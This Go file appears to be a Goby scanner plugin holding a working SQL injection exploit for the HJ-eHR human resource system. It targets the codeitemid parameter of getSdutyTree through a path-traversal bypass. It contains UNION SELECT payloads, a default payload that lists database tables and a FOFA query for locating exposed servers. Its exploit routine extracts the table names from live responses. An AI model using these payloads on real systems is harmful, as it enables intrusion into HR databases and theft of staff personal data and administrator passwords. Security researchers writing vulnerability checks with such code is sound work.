package main

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "HJ-eHR getSdutyTree SQL Injection Vulnerability",
    "Description": "<p>HJ-eHR is a human resource management software developed by Beijing Hongjing Century Software Co., LtdThis vulnerability arises from the lack of strict filtering of the codeitemid parameter in/servlet/sduty/getSdutyTree, leading to SQL injection. Attackers can exploit this vulnerability to obtain information in the database (such as administrator background passwords, site user personal information), and even write trojans to the server in high privilege situations, further gaining server system privileges</p>",
    "Product": "HJ-eHR",
    "Homepage": "http://hjsoft.com.cn/#/",
    "DisclosureDate": "2024-07-29",
    "PostTime": "2024-07-31",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "body=\"/templates/index/hcmlogon.do\" && body=\"宏景\" || body=\"/general/sys/hjaxmanage.js\" && body=\"宏景\"",
    "GobyQuery": "body=\"/templates/index/hcmlogon.do\" && body=\"宏景\" || body=\"/general/sys/hjaxmanage.js\" && body=\"宏景\"",
    "Level": "2",
    "Impact": "<p>An attacker can exploit this vulnerability to obtain information in the database (such as administrator background passwords and site user personal information), or even write Trojans to the server in the case of high privilege to further obtain server system privileges</p>",
    "Recommendation": "<p>1.Parameter Validation 2.Special Character Filtering 3.Use Parameterized Statements, Don't Splice SQL 4.Encode Output 5.Platform Filtering</p>",
    "References": [
        "https://blog.csdn.net/m0_60571842/article/details/140218276"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%6e%61%6d%65%2c%4e%55%4c%4c%2c%4e%55%4c%4c%20%46%52%4f%4d%20%73%79%73%2e%6f%62%6a%65%63%74%73%20%2d%2d%20%6e%63%41%6f",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "qxjpqjwUIWcKtHqhkYslITEIKSbtxYTRxTtXpWImhWfaMqvjzq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid={{{AttackType}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<TreeNode id=\"$$00\" text=\"root\" title=\"codeitem\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "宏景eHR getSdutyTree SQL 注入漏洞",
            "Product": "宏景eHR",
            "Description": "<p>宏景eHR是由北京宏景世纪软件股份有限公司开发的一款人力资源管理软件</p><p>该漏洞源于/servlet/sduty/getSdutyTree中的codeitemid参数没有严格过滤导致sql注入，攻击者可以利用这个漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限</p>",
            "Recommendation": "<p>1.参数验证2.特殊字符过滤3.使用参数化语句，不要拼接sql4.编码输出5.平台过滤<br></p>",
            "Impact": "<p>攻击者可以利用这个漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "HJ-eHR getSdutyTree SQL Injection Vulnerability",
            "Product": "HJ-eHR",
            "Description": "<p>HJ-eHR is a human resource management software developed by Beijing Hongjing Century Software Co., LtdThis vulnerability arises from the lack of strict filtering of the codeitemid parameter in/servlet/sduty/getSdutyTree, leading to SQL injection. Attackers can exploit this vulnerability to obtain information in the database (such as administrator background passwords, site user personal information), and even write trojans to the server in high privilege situations, further gaining server system privileges<br></p>",
            "Recommendation": "<p>1.Parameter Validation 2.Special Character Filtering 3.Use Parameterized Statements, Don't Splice SQL 4.Encode Output 5.Platform Filtering<br></p>",
            "Impact": "<p>An attacker can exploit this vulnerability to obtain information in the database (such as administrator background passwords and site user personal information), or even write Trojans to the server in the case of high privilege to further obtain server system privileges<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10981"
}`

	sendInitialPayload_qLtxmB := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := `/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd`
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "qxjpqjwUIWcKtHqhkYslITEIKSbtxYTRxTtXpWImhWfaMqvjzq") {
			return nil, errors.New("not info")
		}
		return resp, nil
	}

	sendExploitPayload_AXFDwp := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=` + sql
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			_, err := sendInitialPayload_qLtxmB(hostInfo)
			if err != nil {
				return false
			}

			ss.VulURL = hostInfo.FixedHostInfo + `/w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%2B%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%2B%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2873%2B%2BCHAR%28109%29%2BCHAR%2887%2B%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])

			var resp *httpclient.HttpResponse
			var err error

			if attackType == "sql" {
				resp, err = sendExploitPayload_AXFDwp(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 提取所有 text 标签中的内容
				pattern := `<TreeNode[^>]+text="([^"]+)"[^>]*>`
				re := regexp.MustCompile(pattern)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)

				if len(matches) > 0 {
					tableNames := []string{}
					for _, match := range matches {
						if len(match) > 1 {
							tableNames = append(tableNames, match[1])
						}
					}
					expResult.Success = true
					expResult.Output = `Extracted table names: ` + strings.Join(tableNames, ", ")
					return expResult
				}
				expResult.Output = `漏洞利用失败: 未找到表名`
				expResult.Success = false
				return expResult
			}

			if attackType == "sqlPoint" {
				resp, err = sendExploitPayload_AXFDwp(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=` + sql + ` HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Response: ` + resp.Utf8Html
				return expResult
			}

			return expResult
		},
	))
}
